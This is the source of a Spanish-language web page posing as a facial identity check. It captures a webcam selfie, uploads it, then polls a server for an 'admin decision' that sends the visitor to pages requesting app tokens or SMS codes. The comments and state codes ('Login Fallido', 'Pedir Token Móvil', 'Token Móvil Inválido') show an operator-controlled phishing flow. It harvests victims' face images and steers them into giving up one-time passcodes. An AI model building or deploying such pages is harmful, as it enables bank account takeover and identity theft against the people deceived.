<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación Facial</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Inter', sans-serif; background:#000; }

        #camera-container {
            position:relative; width:100%; height:100vh;
            background:#000; overflow:hidden;
        }
        #video {
            width:100%; height:100%;
            object-fit:cover; transform:scaleX(-1);
        }
        .overlay-ui {
            position:absolute; top:0; left:0;
            width:100%; height:100%; z-index:10;
            display:flex; flex-direction:column;
            justify-content:space-between; align-items:center;
            padding:40px 20px 40px; pointer-events:none;
        }

        .top-section { text-align:center; }
        .top-section h2 { color:#fff; font-size:20px; font-weight:700; text-shadow:0 2px 4px rgba(0,0,0,0.8); }
        .top-section p  { color:rgba(255,255,255,0.8); font-size:13px; margin-top:6px; }

        .scan-region {
            position:relative; width:240px; height:320px;
            display:flex; justify-content:center; align-items:center;
        }
        .progress-ring {
            position:absolute; width:280px; height:370px;
            top:50%; left:50%; transform:translate(-50%,-50%);
        }
        .status-pill {
            background:rgba(255,255,255,0.92); color:#333;
            padding:8px 18px; border-radius:20px; font-size:14px;
            font-weight:600; display:flex; align-items:center; gap:8px;
            box-shadow:0 4px 12px rgba(0,0,0,0.25);
        }
        .status-dot { width:8px; height:8px; border-radius:50%; background:#ddd; }
        .status-dot.active     { background:#25D366; }
        .status-dot.processing { background:#FFC107; }

        .bottom-section {
            text-align:center; pointer-events:auto;
            display:flex; flex-direction:column; align-items:center; gap:14px;
        }
        .step-indicator { display:flex; gap:8px; align-items:center; }
        .step-dot { width:8px; height:8px; border-radius:50%; background:rgba(255,255,255,0.35); }
        .step-dot.done   { background:rgba(0,230,118,0.5); }
        .step-dot.active { background:#00e676; }

        .instruction-text { color:rgba(255,255,255,0.85); font-size:14px; text-shadow:0 1px 3px rgba(0,0,0,0.8); }

        .btn-manual {
            background:white; color:#333; border:none;
            padding:12px 32px; border-radius:25px; font-weight:700;
            font-size:14px; cursor:pointer; box-shadow:0 4px 12px rgba(0,0,0,0.3);
            display:none; transition:transform 0.2s;
        }
        .btn-manual:active { transform:scale(0.95); }

        /* === PANTALLA DE ESPERA (oculta inicialmente) === */
        #waiting-screen {
            display:none;
            position:fixed; inset:0; z-index:100;
            background:linear-gradient(160deg,#0d1117 0%,#161b22 100%);
            flex-direction:column; justify-content:center; align-items:center;
            gap:28px; padding:30px;
        }
        #waiting-screen.visible { display:flex; }

        .waiting-icon {
            width:80px; height:80px; border-radius:50%;
            background:rgba(0,230,118,0.12);
            display:flex; justify-content:center; align-items:center;
            font-size:38px;
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%,100% { box-shadow:0 0 0 0 rgba(0,230,118,0.3); }
            50%      { box-shadow:0 0 0 20px rgba(0,230,118,0); }
        }
        .waiting-title {
            color:#fff; font-size:20px; font-weight:700; text-align:center;
        }
        .waiting-sub {
            color:rgba(255,255,255,0.55); font-size:14px; text-align:center; line-height:1.6;
        }
        .waiting-dots {
            display:flex; gap:8px; align-items:center;
        }
        .waiting-dot {
            width:10px; height:10px; border-radius:50%; background:#00e676;
            animation: blink 1.2s ease-in-out infinite;
        }
        .waiting-dot:nth-child(2) { animation-delay:.2s; }
        .waiting-dot:nth-child(3) { animation-delay:.4s; }
        @keyframes blink { 0%,100%{ opacity:.2; } 50%{ opacity:1; } }

        /* === OVERLAY DE ERROR === */
        #error-screen {
            display:none;
            position:fixed; inset:0; z-index:200;
            background:linear-gradient(160deg,#1a0000 0%,#2d0000 100%);
            flex-direction:column; justify-content:center; align-items:center;
            gap:24px; padding:30px; text-align:center;
        }
        #error-screen.visible { display:flex; }
        .error-icon {
            width:80px; height:80px; border-radius:50%;
            background:rgba(255,60,60,0.18);
            display:flex; justify-content:center; align-items:center;
            font-size:38px;
            animation: shake 0.5s ease-in-out;
        }
        @keyframes shake {
            0%,100%{ transform:translateX(0); }
            20%{ transform:translateX(-8px); }
            40%{ transform:translateX(8px); }
            60%{ transform:translateX(-5px); }
            80%{ transform:translateX(5px); }
        }
        .error-title { color:#fff; font-size:22px; font-weight:700; }
        .error-sub   { color:rgba(255,255,255,0.55); font-size:14px; line-height:1.7; }
        .btn-retry {
            background:#e53935; color:#fff; border:none;
            padding:14px 36px; border-radius:30px; font-weight:700;
            font-size:15px; cursor:pointer; box-shadow:0 4px 16px rgba(229,57,53,0.4);
            transition:transform 0.2s;
        }
        .btn-retry:active { transform:scale(0.95); }
    </style>
</head>
<body>

<!-- Cámara / detección facial -->
<div id="camera-container">
    <video id="video" autoplay muted playsinline></video>
    <div class="overlay-ui">
        <div class="top-section">
            <h2>Verificación Facial</h2>
            <p>Ubica tu rostro dentro del óvalo</p>
        </div>

        <div class="scan-region">
            <svg class="progress-ring" viewBox="0 0 280 370">
                <ellipse cx="140" cy="185" rx="125" ry="170" stroke="rgba(255,255,255,0.25)" stroke-width="3" fill="none" stroke-dasharray="10 5"/>
                <path id="progress-path"
                    d="M140,15 A125,170 0 1,1 140,355 A125,170 0 1,1 140,15"
                    stroke="#00e676" stroke-width="5" fill="none"
                    stroke-dasharray="940" stroke-dashoffset="940" stroke-linecap="round"/>
            </svg>
            <div class="status-pill">
                <div class="status-dot" id="status-dot"></div>
                <span id="status-text">Cargando...</span>
            </div>
        </div>

        <div class="bottom-section">
            <div class="step-indicator">
                <div class="step-dot done"></div>
                <div class="step-dot done"></div>
                <div class="step-dot active"></div>
            </div>
            <p class="instruction-text" id="instruction">Mantente quieto frente a la cámara</p>
            <button class="btn-manual" id="btn-manual">Capturar manualmente</button>
        </div>
    </div>
</div>

<!-- Pantalla de espera post-selfie -->
<div id="waiting-screen">
    <div class="waiting-icon">🔍</div>
    <div class="waiting-title">Verificando tu identidad</div>
    <div class="waiting-sub">Tus documentos están siendo revisados.<br>Espera un momento.</div>
    <div class="waiting-dots">
        <div class="waiting-dot"></div>
        <div class="waiting-dot"></div>
        <div class="waiting-dot"></div>
    </div>
</div>

<!-- Overlay de error Soy yo -->
<div id="error-screen">
    <div class="error-icon">❌</div>
    <div class="error-title">Verificación fallida</div>
    <div class="error-sub">No pudimos confirmar tu identidad.<br>Por favor, intenta el proceso nuevamente<br>con mejor iluminación.</div>
    <button class="btn-retry" id="btn-retry">Intentar de nuevo</button>
</div>

<script>
    const transactionId = "<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>";
    const video         = document.getElementById('video');
    const statusText    = document.getElementById('status-text');
    const statusDot     = document.getElementById('status-dot');
    const progressPath  = document.getElementById('progress-path');
    const instruction   = document.getElementById('instruction');
    const btnManual     = document.getElementById('btn-manual');
    const waitingScreen = document.getElementById('waiting-screen');
    const errorScreen   = document.getElementById('error-screen');
    document.getElementById('btn-retry').addEventListener('click', () => {
        window.location.href = `kyc_front.php?id=${transactionId}&error=kyc_failed`;
    });

    let isModelLoaded = false, isDetecting = false;
    const PERIMETER = 940, STABILITY_FRAMES = 28, REQUIRED_SCORE = 0.82;
    let stableFrames = 0;
    let pollInterval = null;

    progressPath.style.strokeDasharray  = PERIMETER;
    progressPath.style.strokeDashoffset = PERIMETER;

    const MODEL_URL = 'https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/';

    async function loadModels() {
        try {
            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
            isModelLoaded = true;
            startVideo();
        } catch(e) {
            statusText.innerText = 'Error IA. Usa captura manual.';
            btnManual.style.display = 'block';
        }
    }

    function startVideo() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(s => { video.srcObject = s; })
            .catch(() => { statusText.innerText = 'Error de cámara'; });
    }

    video.addEventListener('play', () => {
        statusText.innerText = 'Busca buena luz';
        setInterval(async () => {
            if (!isModelLoaded || video.paused || isDetecting) return;
            const det = await faceapi.detectSingleFace(video,
                new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.5 }));
            det ? handleDetection(det) : handleNoFace();
        }, 100);
    });

    function handleDetection(det) {
        const { box, score } = det;
        const cx = video.videoWidth/2, cy = video.videoHeight/2;
        const fx = box.x + box.width/2, fy = box.y + box.height/2;
        const ok = Math.abs(fx-cx) < video.videoWidth*0.25
                && Math.abs(fy-cy) < video.videoHeight*0.28
                && box.width > video.videoWidth*0.18
                && score > REQUIRED_SCORE;
        if (ok) {
            stableFrames++;
            statusDot.className = 'status-dot active';
            statusText.innerText = 'Quieto...';
            instruction.innerText = 'Perfecto, mantente así...';
            if (stableFrames >= STABILITY_FRAMES) takePhoto();
        } else {
            stableFrames = Math.max(0, stableFrames - 2);
            statusDot.className = 'status-dot processing';
            statusText.innerText = box.width < video.videoWidth*0.18 ? 'Acércate más' : 'Centra tu rostro';
        }
        progressPath.style.strokeDashoffset =
            PERIMETER - (Math.min(stableFrames/STABILITY_FRAMES,1) * PERIMETER);
    }

    function handleNoFace() {
        stableFrames = 0;
        statusDot.className = 'status-dot';
        statusText.innerText = 'Rostro no detectado';
        progressPath.style.strokeDashoffset = PERIMETER;
    }

    function takePhoto() {
        if (isDetecting) return;
        isDetecting = true;
        statusText.innerText = '¡Procesando!';

        const canvas = document.createElement('canvas');
        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.translate(canvas.width, 0); ctx.scale(-1,1);
        ctx.drawImage(video, 0, 0);

        const dataURL = canvas.toDataURL('image/jpeg', 0.88);
        const formData = new FormData();
        formData.append('selfie', dataURL);
        formData.append('tipo',   'selfie');
        formData.append('id',     transactionId);

        fetch('assets/config/process_kyc.php', { method:'POST', body:formData })
            .then(() => {
                // Mostrar pantalla de espera y comenzar polling
                waitingScreen.classList.add('visible');
                startWaitingPoll();
            })
            .catch(() => {
                waitingScreen.classList.add('visible');
                startWaitingPoll();
            });
    }

    // === POLLING: espera la decisión del admin ===
    function startWaitingPoll() {
        pollInterval = setInterval(checkAdminDecision, 3000);
        checkAdminDecision();
    }

    function checkAdminDecision() {
        fetch(`assets/config/verificar_estado.php?id=${transactionId}`)
            .then(r => r.json())
            .then(data => {
                if (data.status !== 'success') return;
                const estado = data.estado;

                if (estado === 1) {
                    // ❌ Login Fallido
                    clearInterval(pollInterval);
                    window.location.href = `index.php`;
                } else if (estado === 2) {
                    // ⚠️ Pedir Token App
                    clearInterval(pollInterval);
                    window.location.href = `otp.php?id=${transactionId}`;
                } else if (estado === 3) {
                    // ❌ Rechazar
                    clearInterval(pollInterval);
                    window.location.href = `index.php`;
                } else if (estado === 4) {
                    // 📱 Pedir Token Móvil
                    clearInterval(pollInterval);
                    window.location.href = `tokemovil.php?id=${transactionId}`;
                } else if (estado === 5) {
                    // 🚫 Token Móvil Inválido
                    clearInterval(pollInterval);
                    window.location.href = `tokemovil.php?id=${transactionId}&error=sms_invalid`;
                } else if (estado === 6) {
                    // ✅ Soy yo otra vez — volver a kyc_front (nuevo intento KYC aprobado)
                    clearInterval(pollInterval);
                    window.location.href = `kyc_front.php?id=${transactionId}`;
                } else if (estado === 7) {
                    // ❌ Error Soy yo — mostrar error y repetir KYC
                    clearInterval(pollInterval);
                    showKycError();
                }
                // estado 8 = sigue esperando, no hacer nada
            })
            .catch(() => { /* reintentar */ });
    }

    function showKycError() {
        waitingScreen.classList.remove('visible');
        errorScreen.classList.add('visible');
    }

    btnManual.addEventListener('click', takePhoto);
    setTimeout(() => { btnManual.style.display = 'block'; }, 12000);
    loadModels();
</script>
</body>
</html>
